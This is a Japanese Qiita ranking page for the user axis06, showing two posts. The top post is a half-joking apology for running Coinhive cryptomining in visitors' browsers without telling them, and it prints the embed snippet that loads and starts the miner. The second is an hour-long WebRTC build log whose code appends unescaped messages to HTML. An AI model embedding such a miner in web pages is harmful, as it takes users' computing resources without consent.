<html>
	<head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110075493-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-110075493-1');
</script>
<!-- Google AdSense -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-6168511236629369",
    enable_page_level_ads: true
  });
</script>

		<meta charset="UTF-8" />
		<title>Qiita Ranking (axis06)</title>
		<link rel="stylesheet" type="text/css" href="../qranking.css">
	</head>
	<body>
<div class="headerContainer">
<h1>Qiitaいいね数ランキング (axis06 さんの投稿分)</h1>
</div><!--class="headerContainer"-->
<p><a href="#" onclick="javascript:window.history.back(-1);return false;">[戻る]</a></p>
<p><i><img width="16" height="16" src="../thumb-up-120px.png" /></i>が同じ値の場合は投稿日時の新しいものが上位としています。</p>
<p><i><img width="16" height="16" src="../thumb-up-120px.png" /></i>がついていない記事は表示していません。</p>
<table border="1">
<tr>
	<td rowspan="3"><center>axis06さんの<br />1位</center></td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>115</kbd>
		<a target="_blank" href="https://qiita.com/axis06/items/ccad6b372bd7b8d467b8">【謝罪】皆様が利用している間に、コインマイニングしていた話【Coinhive】</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-21 17:20:30</center>
	</td>
	<td style="width:200px;">
		@axis06<br />(DiverFront,Inc 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/69141/profile-images/1494929586">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[Bitcoin]</b> <b>[Coinhive]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>まだ、1時間でサービス開発を読んでない方はこちら。<br>
<a href="https://qiita.com/axis06/items/49ba9360aea181b536e8" id="reference-559cb87576c2f6a8c8dc">iOS11でWebRTCを利用したアプリを1時間で作った話 - Qiita</a><br>
<a href="https://camo.qiitausercontent.com/008561eabdcbd87d10273a882f2046b599b1c218/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36393134312f65333761643835612d353937322d636161322d333061312d3235646330316633636662632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/008561eabdcbd87d10273a882f2046b599b1c218/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36393134312f65333761643835612d353937322d636161322d333061312d3235646330316633636662632e706e67" alt="ogp.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/69141/e37ad85a-5972-caa2-30a1-25dc01f3cfbc.png"></a></p>

<p>累計利用者数１０００人以上の方々ありがとうございました。</p>

<h2>
<span id="coinhive" class="fragment"></span><a href="#coinhive"><i class="fa fa-link"></i></a>CoinHive</h2>

<p><a href="https://gyazo.com/0bcb11c7eb16171f86a00c910e3e26fa" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/aae6f6ef0e4209f3c2e6b693ba21f027bc55dea7/68747470733a2f2f692e6779617a6f2e636f6d2f30626362313163376562313631373166383661303063393130653365323666612e706e67" alt="https://gyazo.com/0bcb11c7eb16171f86a00c910e3e26fa" data-canonical-src="https://i.gyazo.com/0bcb11c7eb16171f86a00c910e3e26fa.png"></a></p>

<p><a href="https://coin-hive.com/" class="autolink" rel="nofollow noopener" target="_blank">https://coin-hive.com/</a></p>

<p>サービス開発中に広告を出すか悩んでいたとき、Twitterでこのサービスを見つけました。<br>
これは皆様がウェブを見ているときのリソースの一部で仮想通貨をマイニングするサービスです。</p>

<h2>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h2>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://coin-hive.com/lib/coinhive.min.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="kd">var</span> <span class="nx">miner</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CoinHive</span><span class="p">.</span><span class="nx">Anonymous</span><span class="p">(</span><span class="s1">'&lt;site-key&gt;'</span><span class="p">);</span>
    <span class="nx">miner</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div></div>

<p>これだけ。</p>

<h2>
<span id="本題" class="fragment"></span><a href="#%E6%9C%AC%E9%A1%8C"><i class="fa fa-link"></i></a>本題</h2>

<p>さて今回どれくらい稼げたでしょうか。</p>

<p>それは</p>

<p>なんと</p>

<p><em>0.00015    XMR</em></p>

<p>ドルにすると</p>

<p><em>0.0141429180USD</em></p>

<p>日本円にすると</p>

<p>1.12676056 円</p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>　まとめ</h1>

<p>僕の時給は1円でした。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>axis06さんの<br />2位</center></td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>69</kbd>
		<a target="_blank" href="https://qiita.com/axis06/items/49ba9360aea181b536e8">iOS11でWebRTCを利用したアプリを1時間で作った話</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-21 01:32:11</center>
	</td>
	<td style="width:200px;">
		@axis06<br />(DiverFront,Inc 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/69141/profile-images/1494929586">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[WebRTC]</b> <b>[ios11]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="すべての始まり" class="fragment"></span><a href="#%E3%81%99%E3%81%B9%E3%81%A6%E3%81%AE%E5%A7%8B%E3%81%BE%E3%82%8A"><i class="fa fa-link"></i></a>すべての始まり</h2>

<blockquote class="twitter-tweet">
<p>スマホの方がキーボードより入力しやすいからスマホでPCにテキスト打ち込めるツールがほしいというリプを、おそらく学生のフォロワーさんからいただき、朝から戦慄してる</p>— SHARP シャープ株式会社 (@SHARP_JP) <a href="https://twitter.com/SHARP_JP/status/910316428342943744" rel="nofollow noopener" target="_blank">September 20, 2017</a>
</blockquote>



<h2>
<span id="ios11からsafariにて公式にwebrtcが対応になりました" class="fragment"></span><a href="#ios11%E3%81%8B%E3%82%89safari%E3%81%AB%E3%81%A6%E5%85%AC%E5%BC%8F%E3%81%ABwebrtc%E3%81%8C%E5%AF%BE%E5%BF%9C%E3%81%AB%E3%81%AA%E3%82%8A%E3%81%BE%E3%81%97%E3%81%9F"><i class="fa fa-link"></i></a>iOS11からSafariにて公式にWebRTCが対応になりました!</h2>

<p><a href="https://camo.qiitausercontent.com/008561eabdcbd87d10273a882f2046b599b1c218/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36393134312f65333761643835612d353937322d636161322d333061312d3235646330316633636662632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/008561eabdcbd87d10273a882f2046b599b1c218/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36393134312f65333761643835612d353937322d636161322d333061312d3235646330316633636662632e706e67" alt="ogp.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/69141/e37ad85a-5972-caa2-30a1-25dc01f3cfbc.png"></a><br>
<a href="http://axis06.main.jp/key/" class="autolink" rel="nofollow noopener" target="_blank">http://axis06.main.jp/key/</a><br>
スマホからパソコンへフリック入力でレポートがかけるサービスを作りました。</p>

<h2>
<span id="webrtcとは" class="fragment"></span><a href="#webrtc%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>WebRTCとは</h2>

<p>WebRTCはWeb上でも端末同士でのP2Pを行うことができるAPIの定義です。<br>
音声、映像、テキストデータなど中央管理サーバーを建てなくても個人同士でやり取りができます。</p>

<h2>
<span id="websocketとの違い" class="fragment"></span><a href="#websocket%E3%81%A8%E3%81%AE%E9%81%95%E3%81%84"><i class="fa fa-link"></i></a>websocketとの違い</h2>

<p>今までのWebSocket通信は中央管理サーバーを用意し、ユーザー間で同じデータを取り持つよう常時起動している必要があり、多くの接続に対するコストも比例して増大していました。</p>

<p>しかし、WebRTCに関しては最初にIPのデータを送り合うシグナリングサーバーさえあればユーザー間のデータ送信は無限に行って大丈夫です。サーバーレスのため負荷によるレスポンスの遅れもありません。</p>

<h2>
<span id="skyway" class="fragment"></span><a href="#skyway"><i class="fa fa-link"></i></a>SkyWay</h2>

<p><a href="https://webrtc.ecl.ntt.com/" class="autolink" rel="nofollow noopener" target="_blank">https://webrtc.ecl.ntt.com/</a></p>

<p>NTTコミュニケーションズが密かに開発している、WebRTCに必要なサーバを構築・運用することなく、手軽にビデオ・音声通話、データ通信を利用できるサービス。今回はこれを利用しました。</p>

<h2>
<span id="本サービスの使い方" class="fragment"></span><a href="#%E6%9C%AC%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>本サービスの使い方</h2>

<blockquote class="twitter-tweet">
<p><a href="https://t.co/QnsHraK2Y9" rel="nofollow noopener" target="_blank">https://t.co/QnsHraK2Y9</a> <a href="https://t.co/yUGzNN0bmh" rel="nofollow noopener" target="_blank">pic.twitter.com/yUGzNN0bmh</a></p>— 古田克海 (@axis06) <a href="https://twitter.com/axis06/status/910522666863312896" rel="nofollow noopener" target="_blank">September 20, 2017</a>
</blockquote>



<h2>
<span id="開発スケジュール" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>開発スケジュール</h2>

<h3>
<span id="10m" class="fragment"></span><a href="#10m"><i class="fa fa-link"></i></a>10m</h3>

<p>サービスの企画。（ツイッターで現代っ子はフリック入力しかできないらしい）→解決しなくては</p>

<h3>
<span id="20m" class="fragment"></span><a href="#20m"><i class="fa fa-link"></i></a>20m</h3>

<p>SkyWayサービスの登録<br>
チャットのサンプルを動かす</p>

<h3>
<span id="30m" class="fragment"></span><a href="#30m"><i class="fa fa-link"></i></a>30m</h3>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span>
  <span class="kr">const</span> <span class="nx">peer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Peer</span><span class="p">({</span>
    <span class="c1">// Set API key for cloud server (you don't need this if you're running your</span>
    <span class="c1">// own.</span>
    <span class="nx">key</span><span class="o">:</span>         <span class="nb">window</span><span class="p">.</span><span class="nx">__SKYWAY_KEY__</span><span class="p">,</span>
    <span class="c1">// Set highest debug level (log everything!).</span>
    <span class="nx">debug</span><span class="o">:</span>       <span class="mi">3</span><span class="p">,</span>
    <span class="c1">// Set a logging function:</span>
    <span class="nx">logFunction</span><span class="o">:</span> <span class="nx">args</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="kr">const</span> <span class="nx">copy</span> <span class="o">=</span> <span class="p">[...</span><span class="nx">args</span><span class="p">].</span><span class="nx">join</span><span class="p">(</span><span class="s1">' '</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="s1">'.log'</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="nx">copy</span> <span class="o">+</span> <span class="s1">'&lt;br&gt;'</span><span class="p">);</span>
    <span class="p">},</span>
  <span class="p">});</span>
  <span class="kr">const</span> <span class="nx">connectedPeers</span> <span class="o">=</span> <span class="p">{};</span>

  <span class="c1">// Show this peer's ID.</span>
  <span class="nx">peer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'open'</span><span class="p">,</span> <span class="nx">id</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="s1">'#pid'</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
  <span class="p">});</span>
  <span class="c1">// Await connections from others</span>
  <span class="nx">peer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'connection'</span><span class="p">,</span> <span class="nx">connect</span><span class="p">);</span>
  <span class="nx">peer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'error'</span><span class="p">,</span> <span class="nx">err</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">));</span>
</pre></div></div>

<p>基本的にはライブラリが全部やってくれる。<br>
このコードで自分のIDが振られ、空いた状態になる。</p>

<h3>
<span id="40m" class="fragment"></span><a href="#40m"><i class="fa fa-link"></i></a>40m</h3>

<p>スマホからの接続</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span>
    <span class="nx">eachActiveRoom</span><span class="p">((</span><span class="nx">room</span><span class="p">,</span> <span class="nx">$c</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="nx">room</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
      <span class="nx">$c</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="s1">'.messages'</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="s1">'&lt;div&gt;&lt;span class="you"&gt;You: &lt;/span&gt;'</span> <span class="o">+</span> <span class="nx">msg</span>
        <span class="o">+</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">);</span>
    <span class="p">});</span>


</pre></div></div>

<p>このコードで自分が送りたい相手へのIDを探してきてその相手へデータを送る。</p>

<h3>
<span id="50m" class="fragment"></span><a href="#50m"><i class="fa fa-link"></i></a>50m</h3>

<p>ネットへデプロイ<br>
OGP周りの修正</p>

<h3>
<span id="60m" class="fragment"></span><a href="#60m"><i class="fa fa-link"></i></a>60m</h3>

<p>完成！</p>

<p>疲れました....</p>
</div>
	</td>
</tr>
</table>
<br />
	</body>
</html>
